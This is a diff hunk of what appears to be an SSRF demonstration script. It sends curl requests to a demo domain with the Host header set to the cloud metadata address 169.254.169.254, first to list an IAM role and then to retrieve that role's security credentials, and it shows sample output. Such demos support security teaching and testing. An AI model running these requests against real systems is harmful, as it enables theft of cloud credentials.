@@ -4,12 +4,10 @@
 
 URL=ssrfdemo.getserverless.com.au
 curl -s http://${URL}/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo
-
 # output e.g.
 # SSRFDEMO-ISRM-WAF-ROLE
 
 curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/SSRFDEMO-ISRM-WAF-ROLE -H 'Host:169.254.169.254';echo
-
 # output e.g.
 #{
 #  "Code": ...,
